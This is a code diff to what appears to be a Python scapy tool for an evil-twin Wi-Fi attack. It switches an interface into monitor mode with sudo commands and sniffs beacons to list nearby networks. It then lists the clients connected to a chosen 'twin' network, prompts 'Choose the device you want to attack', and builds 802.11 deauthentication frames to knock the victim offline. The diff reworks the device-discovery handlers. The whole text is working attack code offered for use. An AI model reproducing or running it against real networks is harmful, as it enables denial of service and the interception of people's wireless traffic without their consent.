@@ -16,7 +16,8 @@ networks.set_index("BSSID", inplace=True)
 network_mac = dict()
 tic = time.perf_counter()
 ch = 1
-devices = dict()
+twin = ''
+devices = set()
 interface = ''
 presentation = '''
 
@@ -36,6 +37,7 @@ def main():
     global network_mac
     global presentation
     global interface
+    global twin
     print(presentation)
     progress2()
     os.system('clear')
@@ -43,17 +45,23 @@ def main():
     monitor_mode(interface)
     print("[+]Interface switched to monitor mode successfully")
     time.sleep(1)
-    print("[+]Scanning for wireless networks over all channels this will take 1 minute")
+    print("[+]Scanning for wireless networks")
     # change interface wifi channel
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
     channel_changer.start()
     progbar = Thread(target=progressbar)
     progbar.start()
-    sniff(prn=callback, iface=interface, timeout=60, monitor=True)
+    sniff(prn=handler, iface=interface, timeout=30, monitor=True)
     time.sleep(1)
     twin = get_network().lower()
-    victim = get_device(twin).lower()
+    time.sleep(1)
+    print('[+]scanning for connected devices')
+    progbar = Thread(target=progressbar)
+    progbar.start()
+    sniff(prn=devices_handler, iface=interface, timeout=30, monitor=True)
+    time.sleep(1)
+    victim = get_device().lower()
     # deauthentication packet to disconnect the victim device from the network
     deauth = Dot11(type=0, subtype=12, addr1=victim, addr2=twin, addr3=twin)
     # stack packet headers
@@ -69,7 +77,7 @@ def progressbar():
     with bar_cls('Scanning', suffix=suffix, max=100) as bar:
         for i in range(100):
             bar.next()
-            time.sleep(0.6)
+            time.sleep(0.3)
 
 
 # get a list of all the interfaces and return the interface chosen by the user
@@ -88,11 +96,9 @@ def get_interface():
 
 # switch interface to monitor mode
 def monitor_mode(iface):
-    try:
-        os.system("bash mon.sh " + iface)
-    except:
-        print("ERROR: make sure that", iface, "Supports monitor mode.")
-        sys.exit(0)
+    os.system('sudo ifconfig ' + str(interface) + ' down')
+    os.system('sudo iwconfig ' + str(interface) + ' mode monitor')
+    os.system('sudo ifconfig ' + str(interface) + ' up')
 
 
 # change channels
@@ -105,8 +111,7 @@ def change_channel():
 
 
 # captures wireless networks and devices with packets sniffed by scapy
-def callback(pkt):
-
+def handler(pkt):
     if pkt.haslayer(Dot11):
 
         mac_frame = pkt.getlayer(Dot11)
@@ -117,36 +122,32 @@ def callback(pkt):
         # if pkt.type == 0 and pkt.subtype == 8:  # beacon which means its coming from a network
         if pkt.haslayer(Dot11Beacon):
             if mac_frame.addr2 not in devices:
-                devices[mac_frame.addr2] = set()
                 ssid = pkt[Dot11Beacon].network_stats()['ssid']
                 network_mac[mac_frame.addr2] = ssid
 
+
+def devices_handler(pkt):
+    if pkt.haslayer(Dot11):
+
+        mac_frame = pkt.getlayer(Dot11)
+        ds = pkt.FCfield & 0x3  # frame control
+        to_ds = ds & 0x1 != 0  # to access point
+        from_ds = ds & 0x2 != 0  # from access point
+
         if from_ds == 1 and to_ds == 0:  # transmitter is AP and destination is client
-            if mac_frame.addr2 in devices and mac_frame.addr3 != mac_frame.addr2 and mac_frame.addr3 \
-                    not in devices[mac_frame.addr2]:
-                devices[mac_frame.addr2].add(mac_frame.addr3)
+            if str(mac_frame.addr2).lower() == twin and mac_frame.addr3 not in devices:
+                devices.add(mac_frame.addr3)
 
         if from_ds == 0 and to_ds == 1:  # source address is client and transmitter is AP
 
-            if mac_frame.addr1 in devices and mac_frame.addr2 \
-                    not in devices[mac_frame.addr1]:
-                devices[mac_frame.addr1].add(mac_frame.addr2)
+            if str(mac_frame.addr1).lower() == twin and mac_frame.addr2 not in devices:
+                devices.add(mac_frame.addr2)
 
         if from_ds == 0 and to_ds == 0:  # control frame or managment from which means src is AP or vice versa
-            if mac_frame.addr3 in devices and mac_frame.addr3 != mac_frame.addr2 and \
-                    mac_frame.addr2 not in devices[mac_frame.addr3]:
-                devices[mac_frame.addr3].add(mac_frame.addr2)
-                if mac_frame.addr2 in devices and mac_frame.addr2 != mac_frame.addr3 and \
-                        mac_frame.addr3 not in devices[mac_frame.addr2]:
-                    devices[mac_frame.addr2].add(mac_frame.addr3)
-
-        '''if from_ds == 1 and to_ds == 1:  # transmitter and reciever could be  APs
-            if mac_frame.addr2 in devices and mac_frame.addr2 != mac_frame.addr4 and \
-                    mac_frame.addr4 not in devices[mac_frame.addr2]:
-                devices[mac_frame.addr3].add(mac_frame.addr2)
-            if mac_frame.addr1 in devices and mac_frame.addr1 != mac_frame.addr3 and mac_frame.addr3 not in \
-                    devices[mac_frame.addr1]:
-                devices[mac_frame.addr1].add(mac_frame.addr3)'''
+            if str(mac_frame.addr3).lower() == twin and mac_frame.addr2 not in devices:
+                devices.add(mac_frame.addr2)
+                if mac_frame.addr2 in devices and mac_frame.addr3 not in devices:
+                    devices.add(mac_frame.addr3)
 
 
 # get a list of networks and return the mac of the network chosen by the user
@@ -164,16 +165,16 @@ def get_network():
 
 
 # list of devices connected to the chosen network and return the victim device chosen by the user
-def get_device(captive):
+def get_device():
     global devices
     device_mac = dict()
-    print("mac address of connected devices")
+    print("mac address of connected devices:")
     i = 0
-    for device in devices[captive]:
+    for device in devices:
         print(i, "- " + str(device))
         device_mac[str(i)] = device
         i = i + 1
-    k = input("Choose the device you want to attack (press 0 - " + str(i) + "): ")
+    k = input("Choose the device you want to attack: ")
     return device_mac[k]
 
 
